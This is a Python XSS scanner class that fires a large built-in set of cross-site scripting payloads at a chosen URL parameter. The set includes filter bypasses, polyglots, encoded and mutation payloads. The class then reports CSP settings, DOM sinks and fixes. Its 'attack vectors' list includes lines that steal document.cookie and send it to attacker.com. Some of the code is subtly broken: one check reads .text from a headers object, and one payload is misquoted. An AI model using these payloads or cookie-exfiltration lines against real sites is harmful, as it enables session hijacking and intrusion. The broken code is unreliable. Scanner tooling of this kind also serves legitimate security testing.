import re
import requests
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


class XSSScanner:
    PAYLOADS = {
        "basic": [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
        ],
        "without_parentheses": [
            "<script>alert`1`</script>",
            "<script>alert`XSS`</script>",
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert`1`>",
        ],
        "without_alert": [
            "<script>confirm(1)</script>",
            "<script>prompt(1)</script>",
            "<script>print()</script>",
            "<script>eval('al'+'ert(1)')</script>",
            "<svg/onload=confirm(1)>",
            "<img src=x onerror=confirm(1)>",
        ],
        "filter_bypass": [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<script>alert(1)//</script>",
            "<<script>alert(1)//<</script>",
            "\"><script>alert(1)</script>",
            "';alert(1)//",
            "<script>window['alert'](1)</script>",
            "<script>self['alert'](1)</script>",
        ],
        "polyglot": [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"><img src=x onerror=alert(1)><!--",
            "\"><svg/onload=alert(1)>",
        ],
        "event_handlers": [
            "onfocus", "onmouseover", "onclick", "ondblclick", "onkeypress",
            "onkeydown", "onkeyup", "onload", "onerror", "onabort", "onresize",
            "onscroll", "onsubmit", "onchange", "oninput", "onblur",
        ],
        "svg_payloads": [
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<svg onload=alert`1`>",
            "<svg><script>alert(1)</script></svg>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        ],
        "template_injection": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
            "{{constructor.constructor('alert(1)')()}}",
        ],
        "encoded": [
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            "\x3cscript\x3ealert(1)\x3c/script\x3e",
        ],
        "mutation": [
            "<img src=1 onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>',
        ],
    }

    def __init__(self, url: str, param: str, method: str = "GET", data: Optional[dict] = None, headers: Optional[dict] = None, cookies: Optional[dict] = None, timeout: int = 10):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.reflected = []
        self.vulnerable = False
        self.confidence = 0
        self.risk_level = "NONE"
        self.findings = []
        self.recommendations = []
        self.attack_vectors = []

    def _send(self, payload: str) -> requests.Response:
        parsed = urlparse(self.url)
        if self.method == "POST":
            test_data = self.data.copy()
            test_data[self.param] = payload
            return requests.post(
                self.url, data=test_data, headers=self.headers,
                cookies=self.cookies, timeout=self.timeout,
                allow_redirects=False, verify=False,
            )
        else:
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[self.param] = [payload]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            return requests.get(
                new_url, headers=self.headers, cookies=self.cookies,
                timeout=self.timeout, allow_redirects=False, verify=False,
            )

    def _check_reflection(self, response: requests.Response, payload: str) -> bool:
        return payload in response.text

    def _check_context(self, response: requests.Response, payload: str) -> str:
        idx = response.text.find(payload)
        if idx == -1:
            return "not-reflected"
        before = response.text[max(0, idx - 100):idx]
        after = response.text[idx + len(payload):idx + len(payload) + 100]
        if "<script" in before.lower():
            return "inside-script-tag"
        if "onclick" in before.lower() or "onerror" in before.lower():
            return "inside-event-handler"
        if "href=" in before.lower() or "src=" in before.lower():
            return "inside-attribute"
        if "<!--" in before:
            return "inside-comment"
        return "in-html-body"

    def _check_encoding(self, response: requests.Response) -> dict:
        encoding = {"html_entity": False, "url_encode": False, "double_encode": False, "null_byte": False}
        html_entities = ["&lt;", "&gt;", "&amp;", "&#60;", "&#62;"]
        for entity in html_entities:
            if entity in response.text:
                encoding["html_entity"] = True
                break
        return encoding

    def _check_csp(self, headers: dict) -> dict:
        csp = {"enabled": False, "report_only": False, "unsafe_inline": False, "unsafe_eval": False, "script_src": None, "directives": {}}
        csp_header = headers.get("Content-Security-Policy", headers.get("content-security-policy", ""))
        if csp_header:
            csp["enabled"] = True
            csp["unsafe_inline"] = "unsafe-inline" in csp_header
            csp["unsafe_eval"] = "unsafe-eval" in csp_header
            for directive in csp_header.split(";"):
                parts = directive.strip().split()
                if parts:
                    csp["directives"][parts[0]] = parts[1:] if len(parts) > 1 else []
            script_match = re.search(r"script-src\s+([^;]+)", csp_header)
            if script_match:
                csp["script_src"] = script_match.group(1).strip()
        return csp

    def _check_dom_sinks(self, html: str) -> list:
        dom_sinks = {
            "document.write": {"severity": "high", "desc": "Writes directly to DOM"},
            "document.writeln": {"severity": "high", "desc": "Writes directly to DOM"},
            "innerHTML": {"severity": "high", "desc": "Sets HTML content"},
            "outerHTML": {"severity": "high", "desc": "Replaces element with HTML"},
            "insertAdjacentHTML": {"severity": "high", "desc": "Inserts HTML at position"},
            "eval": {"severity": "critical", "desc": "Executes arbitrary code"},
            "setTimeout": {"severity": "high", "desc": "Executes code after delay"},
            "setInterval": {"severity": "high", "desc": "Executes code repeatedly"},
            "document.location": {"severity": "medium", "desc": "Redirects page"},
            "window.location": {"severity": "medium", "desc": "Redirects page"},
            "document.URL": {"severity": "medium", "desc": "Reads current URL"},
            "document.referrer": {"severity": "low", "desc": "Reads referring URL"},
            "element.setAttribute": {"severity": "medium", "desc": "Sets element attribute"},
            ".html(": {"severity": "high", "desc": "jQuery HTML injection"},
        }
        findings = []
        for sink, info in dom_sinks.items():
            if re.search(re.escape(sink), html):
                findings.append({"sink": sink, "severity": info["severity"], "description": info["desc"]})
        return findings

    def _check_dom_sources(self, html: str) -> list:
        sources = [
            "document.URL", "document.documentURI", "document.referrer",
            "location.search", "location.hash", "location.href",
            "window.name", "document.cookie",
        ]
        found = []
        for source in sources:
            if source in html:
                found.append(source)
        return found

    def scan(self) -> dict:
        console.print(Panel("[bold cyan]XSS Scanner[/bold cyan]", border_style="cyan"))
        results = {
            "url": self.url, "param": self.param,
            "reflected": [], "vulnerable": False,
            "dom_sinks": [], "dom_sources": [],
            "csp": {}, "encoding": {},
            "confidence": 0, "risk_level": "NONE",
            "context": "not-reflected",
            "findings": [], "recommendations": [], "attack_vectors": [],
        }

        console.print(f"  [yellow]Testing parameter:[/yellow] {self.param}")

        test_payload = "xSsTeSt12345"
        try:
            resp = self._send(test_payload)
            if self._check_reflection(resp, test_payload):
                console.print(f"    [green]Payload reflected in response![/green]")
                results["reflected"].append(test_payload)
                context = self._check_context(resp, test_payload)
                results["context"] = context
                results["findings"].append(f"Payload reflected in context: {context}")

                csp = self._check_csp(dict(resp.headers))
                results["csp"] = csp
                if csp["enabled"]:
                    results["findings"].append(f"CSP enabled: unsafe-inline={csp['unsafe_inline']}, unsafe-eval={csp['unsafe_eval']}")
                    if not csp["unsafe_inline"] and not csp["unsafe_eval"]:
                        results["findings"].append("CSP blocks inline scripts - exploitation may be difficult")
                else:
                    results["findings"].append("No Content-Security-Policy detected")

                dom_sinks = self._check_dom_sinks(resp.text)
                results["dom_sinks"] = dom_sinks
                dom_sources = self._check_dom_sources(resp.text)
                results["dom_sources"] = dom_sources
                if dom_sinks:
                    results["findings"].append(f"DOM XSS sinks found: {len(dom_sinks)}")
                    for sink in dom_sinks[:3]:
                        results["findings"].append(f"  - {sink['sink']} ({sink['severity']}): {sink['description']}")

                encoding = self._check_encoding(resp.headers)
                results["encoding"] = encoding

                console.print(f"    [yellow]Context:[/yellow] {context}")
                console.print(f"  [yellow]Testing XSS payloads...[/yellow]")
                all_payloads = []
                for category, payloads in self.PAYLOADS.items():
                    for payload in payloads:
                        all_payloads.append((category, payload))

                for category, payload in all_payloads:
                    try:
                        resp = self._send(payload)
                        if self._check_reflection(resp, payload):
                            results["reflected"].append(payload)
                            results["vulnerable"] = True
                            results["confidence"] = 90
                            console.print(f"    [bold red]VULNERABLE![/bold red] ({category}) {payload[:60]}...")
                            results["findings"].append(f"Working payload ({category}): {payload[:80]}")
                            break
                    except requests.RequestException:
                        continue
            else:
                console.print(f"    [green]Payload not reflected[/green]")
                results["findings"].append("Test payload not reflected - parameter may be sanitized or not vulnerable")
        except requests.RequestException as e:
            console.print(f"    [red]Error: {e}[/red]")
            results["findings"].append(f"Request error: {e}")

        if results["vulnerable"]:
            results["risk_level"] = "CRITICAL" if results["confidence"] >= 80 else "HIGH"
            results["recommendations"] = self._generate_recommendations(results)
            results["attack_vectors"] = self._generate_attack_vectors(results)
        else:
            results["risk_level"] = "LOW"
            results["recommendations"] = self._generate_safe_recommendations(results)

        self.vulnerable = results["vulnerable"]
        self.confidence = results["confidence"]
        self.risk_level = results["risk_level"]
        return results

    def _generate_recommendations(self, results: dict) -> list:
        recs = [
            "Implement Content-Security-Policy with strict script-src",
            "Use HTML entity encoding for all user-supplied data in HTML context",
            "Use JavaScript encoding for data in JavaScript contexts",
            "Use URL encoding for data in URL attributes",
            "Implement input validation - reject or sanitize HTML tags",
            "Use frameworks that auto-escape by default (React, Angular, Vue)",
        ]
        if results["csp"].get("unsafe_inline"):
            recs.append("Remove 'unsafe-inline' from CSP - use nonces or hashes instead")
        if results["csp"].get("unsafe_eval"):
            recs.append("Remove 'unsafe-eval' from CSP - avoid eval(), Function(), setTimeout(string)")
        if not results["csp"].get("enabled"):
            recs.append("CRITICAL: No CSP detected - implement Content-Security-Policy header immediately")
        if results["dom_sinks"]:
            recs.append("DOM XSS sinks detected - audit client-side JavaScript for dangerous sinks")
        return recs

    def _generate_attack_vectors(self, results: dict) -> list:
        vectors = [
            "<script>alert(document.cookie)</script>",
            "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
            "<img src=x onerror='fetch(https://attacker.com/?c='+document.cookie+')'>",
            "<svg/onload='navigator.sendBeacon(\"https://attacker.com\",document.cookie)'>",
        ]
        if results["context"] == "inside-attribute":
            vectors.append("'-alert(1)-' (attribute breakout)")
        return vectors

    def _generate_safe_recommendations(self, results: dict) -> list:
        recs = [
            "No reflected XSS detected with current tests",
            "Consider testing for stored XSS (submit payloads and check other pages)",
            "Test for DOM-based XSS by auditing client-side JavaScript",
            "Check for XSS in HTTP headers (User-Agent, Referer, etc.)",
            "Test for mutation XSS using HTML parser differentials",
        ]
        if results["dom_sinks"]:
            recs.append("DOM XSS sinks detected even though reflection failed - manual audit recommended")
        return recs

    def generate_payloads(self, filter_rules: Optional[str] = None) -> list:
        console.print("[cyan]Generating XSS payloads...[/cyan]")
        payloads = []
        if not filter_rules:
            payloads = self.PAYLOADS["basic"] + self.PAYLOADS["without_parentheses"]
        else:
            filters = filter_rules.lower().split(",")
            if "alert" in filters:
                payloads.extend(self.PAYLOADS["without_alert"])
            if "parentheses" in filters or "()" in filters:
                payloads.extend(self.PAYLOADS["without_parentheses"])
            if "script" in filters:
                payloads.extend(self.PAYLOADS["svg_payloads"])
            if "event" in filters:
                for event in self.PAYLOADS["event_handlers"]:
                    payloads.append(f"<img src=x {event}=alert(1)>")
            if "angle" in filters or "<>" in filters:
                payloads.extend(self.PAYLOADS["encoded"])
            if not payloads:
                payloads = self.PAYLOADS["filter_bypass"] + self.PAYLOADS["polyglot"]
        return payloads

    def print_results(self, results: dict):
        risk_colors = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}
        risk_color = risk_colors.get(results["risk_level"], "white")

        table = Table(title="XSS Analysis Report", border_style="cyan")
        table.add_column("Property", style="bold")
        table.add_column("Value")
        table.add_row("URL", results["url"])
        table.add_row("Parameter", results["param"])
        table.add_row("Vulnerable", "[bold red]YES[/bold red]" if results["vulnerable"] else "[green]NO[/green]")
        if results["vulnerable"]:
            table.add_row("Reflected Payloads", str(len(results["reflected"])))
            table.add_row("Context", results["context"])
            table.add_row("Confidence", f"{results['confidence']}%")
        table.add_row("Risk Level", f"[{risk_color}]{results['risk_level']}[/{risk_color}]")
        if results["dom_sinks"]:
            table.add_row("DOM XSS Sinks", str(len(results["dom_sinks"])))
        if results["dom_sources"]:
            table.add_row("DOM Sources", ", ".join(results["dom_sources"][:5]))
        if results["csp"].get("enabled"):
            table.add_row("CSP", "Enabled")
            table.add_row("Unsafe Inline", str(results["csp"]["unsafe_inline"]))
            table.add_row("Unsafe Eval", str(results["csp"]["unsafe_eval"]))
        console.print(table)

        if results["findings"]:
            console.print("\n[bold]Findings:[/bold]")
            for f in results["findings"]:
                console.print(f"  [cyan]->[/cyan] {f}")

        if results["recommendations"]:
            console.print("\n[bold]Recommendations:[/bold]")
            for i, r in enumerate(results["recommendations"], 1):
                console.print(f"  {i}. {r}")

        if results["attack_vectors"]:
            console.print("\n[bold]Attack Vectors:[/bold]")
            for v in results["attack_vectors"]:
                console.print(f"  [red]![/red] {v}")
